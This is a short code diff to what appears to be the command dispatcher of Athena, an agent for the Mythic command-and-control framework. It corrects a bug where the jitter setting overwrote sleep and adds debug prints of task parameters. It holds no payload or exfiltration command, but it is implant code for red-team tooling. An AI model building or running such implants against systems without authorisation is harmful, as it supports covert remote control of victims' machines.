@@ -231,6 +231,7 @@ namespace Athena.Commands
                     break;
                 case "sleep":
                     var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
+                    Console.WriteLine(job.task.parameters);
                     if (sleepInfo.ContainsKey("sleep"))
                     {
                         try
@@ -248,7 +249,7 @@ namespace Athena.Commands
                     {
                         try
                         {
-                            Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["jitter"].ToString());
+                            Globals.mc.MythicConfig.jitter = int.Parse(sleepInfo["jitter"].ToString());
                         }
                         catch (Exception e)
                         {
@@ -361,6 +362,7 @@ namespace Athena.Commands
                 default:
                     var defaultTask = Task.Run(() =>
                     {
+                        Console.WriteLine(job.task.parameters);
                         checkAndRunPlugin(job);
                     }, job.cancellationtokensource.Token);
                     break;
